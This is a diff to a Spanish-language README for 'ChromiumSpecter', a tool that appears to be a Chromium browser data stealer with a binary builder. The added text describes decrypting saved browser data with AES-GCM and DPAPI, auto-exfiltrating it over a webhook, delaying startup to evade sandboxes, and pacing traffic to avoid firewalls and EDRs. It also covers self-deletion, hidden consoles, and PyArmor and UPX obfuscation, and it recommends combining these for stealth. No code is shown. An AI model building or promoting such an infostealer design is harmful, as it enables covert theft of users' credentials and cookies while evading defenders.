@@ -31,12 +31,21 @@
 
 ### 🌟 Características Destacadas
 
-* **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados mediante pools de widgets optimizados.
+* **🖥️ Dashboard de Alta Densidad**: Interfaz gráfica profesional con consolas en tiempo real, estadísticas dinámicas y gestión de resultados.
+* **🔐 Motor de Descifrado Dual**:
+  * Soporte simultáneo para **AES-GCM (Chromium v80+)** y **DPAPI Legacy** en la misma base de datos de perfiles.
+  * Descifrado por blob individual — un perfil migrado puede tener entradas de ambos tipos y se procesan correctamente sin descartar nada.
+  * Detección automática del esquema por prefijo (`v10`/`v11`) con fallback inteligente a DPAPI si AES falla.
+  * Perfiles sin llave AES (Chrome antiguo) siguen procesándose en modo DPAPI puro.
 * **🕵️ Motor de Sigilo (Tactical Stealth)**:
-  * **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandbox y Sandbox inteligentes.
+  * **Startup Delay**: Selector de retraso inicial (0-300s) para evadir análisis en Sandboxes.
   * **Inter-file Delay (`send_delay`)**: Pausas personalizables entre envíos para prevenir picos de tráfico que alerten a firewalls o EDRs.
   * **Anti-Forensics**: Soporte para **Autodestrucción Táctica** (Auto-Delete) del binario tras la ejecución.
   * **Protocolo de Pánico**: Saneamiento total del entorno de auditoría con un solo clic.
+* **🧠 Detección Inteligente de Perfiles**:
+  * Escaneo diferenciado: Chrome/Edge/Brave usan subdirectorios (`Default`, `Profile N`); Opera/Vivaldi usan la raíz directamente.
+  * Validación de tamaño de archivo antes de procesar (evita falsos positivos con BD vacías).
+  * Manejo de `PermissionError` por perfil sin abortar el escaneo completo.
 
 <div align="center">
   <img src="screenshots/exit_self-destroy.png" width="600" alt="ChromiumSpecter Panic Exit">
@@ -107,20 +116,27 @@ python main.py --stealth --output-dir "C:\temp\logs"
 
 ## ⚙️ Parámetros de Compilación (Stub)
 
-Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu binario final:
+Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu binario final. Las opciones marcadas con 📡 solo están disponibles cuando el archivo fuente es `main.py` o una copia del mismo.
 
 | Parámetro | Rango / Opción | Propósito |
 | :--- | :--- | :--- |
-| **Delay Inicial** | 0s - 300s | Retraso antes de la primera acción (Anti-Sandbox). |
-| **Send Delay** | 0s - 10s | Pausa entre archivos enviados (Evasión de tráfico). |
-| **Webhook Timeout** | 5s - 60s | Tiempo de espera para conexiones inestables. |
-| **Auto-Exfiltrate** | Checkbox | Activa el envío automático sin intervención. |
+| **Delay Inicial** | 0s - 3600s | Retraso antes de la primera acción (Anti-Sandbox). |
+| **Send Delay** | 0s - 60s | Pausa entre archivos enviados (Evasion de tráfico). |
+| **Webhook Timeout** | 1s - 300s | Tiempo de espera para conexiones inestables. |
+| **📡 Auto-Exfiltrar** | Checkbox | Activa el envío automático sin intervención al ejecutar. |
+| **📡 Modo Stealth** | Runtime Flag | Oculta la consola al arrancar (vía `ShowWindow` Win32 API). |
+| **💥 Autodestrucción** | Checkbox | Elimina el `.exe` tras finalizar el ciclo. |
 | **UAC Prompt** | Toggle | Solicita privilegios de administrador si es necesario. |
-| **Mostrar Consola** | Compiler Flag | Determina si el SO crea la ventana (Console vs Windowed App). |
-| **Modo Stealth** | Runtime Flag | Oculta la ventana creada por el SO mediante código. |
+| **Ofuscar con PyArmor** | Toggle | Aplica ofuscación al código fuente antes de compilar. |
+| **Compresión UPX** | Toggle | Comprime el binario final (reduce tamaño ~30-50%). |
+| **Mostrar Consola** | Compiler Flag | Genera un `Console App`. Si está desmarcado, genera un `Windowed App` invisible. |
 
 > [!TIP]
-> **Diferencia Técnica**: "Mostrar Consola" (Compilador) evita que la ventana se cree desde el inicio (Modo Windowed). "Modo Stealth" (Runtime) la oculta después de creada mediante la API de Windows. Para sigilo total, se recomienda dejar "Mostrar Consola" desmarcado.
+> **Diferencia Técnica — Mostrar Consola vs Modo Stealth**:
+> - **Mostrar Consola** (Compilador): Determina si el **Sistema Operativo** crea la ventana desde cero. Desmarcado = `Windowed App`, nunca hay ventana negra.
+> - **Modo Stealth** (Runtime): La ventana sí se crea, pero el código la oculta en milisegundos con `ShowWindow(0)`. Puede verse un destello breve.
+> - **Recomendación**: Dejá "Mostrar Consola" **desmarcado** + "Modo Stealth" **marcado** para doble capa de sigilo.
+
 
 ---
 
@@ -129,10 +145,11 @@ Al usar el **Builder**, puedes inyectar los siguientes comportamientos en tu bin
 | Componente | Tecnología |
 | :--- | :--- |
 | **Core UI** | `CustomTkinter` (Modern Dark Theme) |
-| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` |
-| **Seguridad OS** | `Windows DPAPI` / `Win32 API` |
-| **Compilación** | `PyInstaller` + `UPX` |
-| **Persistencia** | `JSON` Local (.audit/exfil_config.json) |
+| **Criptografía** | `AES-GCM 256` via `PyCryptodomex` + `Windows DPAPI` |
+| **Seguridad OS** | `Win32 API` (`CryptUnprotectData`, `ShowWindow`) |
+| **Compilación** | `PyInstaller` + `PyArmor` + `UPX` |
+| **Persistencia** | `JSON` Local (`.audit/exfil_config.json`) |
+| **Testing** | `pytest` + `pytest-mock` (18 tests, 0 fallos) |
 
 ---
 
